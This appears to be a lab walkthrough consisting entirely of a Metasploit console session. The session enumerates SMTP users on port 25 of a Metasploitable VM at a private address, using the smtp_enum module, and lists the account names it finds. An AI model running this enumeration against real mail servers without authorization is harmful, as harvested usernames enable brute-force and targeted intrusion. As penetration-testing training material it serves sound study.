# Attacking on Port 25

```
sf > search smtp
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                    Disclosure Date  Rank       Description
   ----                                                    ---------------  ----       -----------
   auxiliary/client/smtp/emailer                                            normal     Generic Emailer (SMTP)
   auxiliary/dos/smtp/sendmail_prescan                     2003-09-17       normal     Sendmail SMTP Address prescan Memory Corruption
   auxiliary/dos/windows/smtp/ms06_019_exchange            2004-11-12       normal     MS06-019 Exchange MODPROP Heap Overflow
   auxiliary/fuzzers/smtp/smtp_fuzzer                                       normal     SMTP Simple Fuzzer
   auxiliary/scanner/http/gavazzi_em_login_loot                             normal     Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database
   auxiliary/scanner/smtp/smtp_enum                                         normal     SMTP User Enumeration Utility
   auxiliary/scanner/smtp/smtp_ntlm_domain                                  normal     SMTP NTLM Domain Extraction
   auxiliary/scanner/smtp/smtp_relay                                        normal     SMTP Open Relay Detection
   auxiliary/scanner/smtp/smtp_version                                      normal     SMTP Banner Grabber
   auxiliary/server/capture/smtp                                            normal     Authentication Capture: SMTP
msf > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target address range or CIDR identifier
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

msf auxiliary(smtp_enum) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101

msf auxiliary(smtp_enum) > set VERBOSE true
VERBOSE => true
msf auxiliary(smtp_enum) > run

[*] 192.168.56.101:25     - 192.168.56.101:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
[*] 192.168.56.101:25     - 192.168.56.101:25 Domain Name: metasploitable.localdomain
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: ...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: 
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: 4Dgifts...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: backup...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: backup
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: bin...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: bin
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: daemon...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: daemon
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: demos...
[*] 192.168.56.101:25     - 192.168.56.101:25 SMTP server annoyed...reconnecting and saying HELO again...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Re-trying MAIL FROM: root@metasploitable.localdomain received 250 '250 2.1.0 Ok'
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: diag...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: distccd...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: distccd
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: ftp...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: ftp
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: games...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: games
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: gnats...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: gnats
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: irc...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: irc
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: libuuid...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: libuuid
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: list...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: list
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: listen...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: lp...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: lp
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: mail...
[*] 192.168.56.101:25     - 192.168.56.101:25 SMTP server annoyed...reconnecting and saying HELO again...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Re-trying MAIL FROM: root@metasploitable.localdomain received 250 '250 2.1.0 Ok'
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: mail
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: man...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: man
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: news...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: news
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: noaccess...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: nobody...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: nobody
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: postgres...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: postgres
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: postmaster...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: postmaster
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: printer...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: proxy...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: proxy
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: service...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: service
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: setup...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: sgiweb...
[*] 192.168.56.101:25     - 192.168.56.101:25 SMTP server annoyed...reconnecting and saying HELO again...
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: sshd...
[*] 192.168.56.101:25     - 192.168.56.101:25 - Found user: sshd
[*] 192.168.56.101:25     - 192.168.56.101:25 - SMTP - Trying MAIL FROM: root@metasploitable.localdomain / RCPT TO: sym...

[+] 192.168.56.101:25     - 192.168.56.101:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, news, nobody, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smtp_enum) > 


```



